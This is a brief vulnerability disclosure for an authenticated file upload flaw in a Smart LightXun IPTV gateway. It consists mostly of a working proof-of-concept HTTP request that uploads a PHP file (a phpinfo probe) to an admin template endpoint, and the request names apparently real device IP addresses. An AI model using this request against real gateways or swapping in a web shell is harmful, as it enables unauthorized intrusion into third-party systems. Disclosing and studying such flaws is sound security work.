There is a file upload vulnerability in Smart LightXun IPTV gateway

1. The login interface is as shown in the figure
![image](https://github.com/willchen0011/cve/assets/13689053/4fe3cfc9-9e83-4320-be4e-882442fab3b6)

2. After logging into the system, capture the packet and construct the POC
```
POST /ZHGXTV/index.php/admin/index/web_upload_template.html HTTP/1.1
Host: 171.124.45.157:888
Content-Length: 893
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZzN3aF71HnOAXhI3
Accept: */*
Origin: http://118.77.61.149:888
Referer: http://118.77.61.149:888/ZHGXTV/index.php/admin/index/upload_templates.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=k9858i4ie8r50o8mhil3p9gklt
Connection: close

------WebKitFormBoundaryZzN3aF71HnOAXhI3
Content-Disposition: form-data; name="folder"

upload_template
------WebKitFormBoundaryZzN3aF71HnOAXhI3
Content-Disposition: form-data; name="id"

WU_FILE_0
------WebKitFormBoundaryZzN3aF71HnOAXhI3
Content-Disposition: form-data; name="name"

1.php
------WebKitFormBoundaryZzN3aF71HnOAXhI3
Content-Disposition: form-data; name="type"

application/octet-stream
------WebKitFormBoundaryZzN3aF71HnOAXhI3
Content-Disposition: form-data; name="lastModifiedDate"

Wed Jul 12 2023 10:10:53 GMT+0800 (中国标准时间)
------WebKitFormBoundaryZzN3aF71HnOAXhI3
Content-Disposition: form-data; name="size"
21
------WebKitFormBoundaryZzN3aF71HnOAXhI3
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream
<?php phpinfo();?>
------WebKitFormBoundaryZzN3aF71HnOAXhI3--
```
![image](https://github.com/willchen0011/cve/assets/13689053/aac53633-b431-4a9a-a907-72de3140067f)

![image](https://github.com/willchen0011/cve/assets/13689053/3005d8d7-d34c-4b0e-9270-10bb99314457)
